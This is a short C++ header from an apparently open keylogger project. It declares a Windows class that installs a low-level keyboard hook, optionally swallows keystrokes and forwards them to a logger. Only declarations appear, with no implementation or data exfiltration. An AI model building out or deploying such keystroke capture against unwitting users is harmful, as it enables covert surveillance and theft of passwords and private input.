#ifndef KEYSTROKE_CAPTURER_WINDOWS
#define KEYSTROKE_CAPTURER_WINDOWS

#include "IKeystrokeCapturer.h"
#include "ILogger.h"

#include <windows.h>

namespace Keylogger {

class KeystrokeCapturerWindows : public IKeystrokeCapturer {
 public:
    bool start();
    void stop();

    void consumeKeystrokes(bool consume);
    void setLogger(ILogger* logger);

 private:
    static bool _consumeKeystrokes;

    HHOOK _keyboardHook;
    static ILogger* _logger;

    static LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
};

}

#endif // KEYSTROKE_CAPTURER_WINDOWS
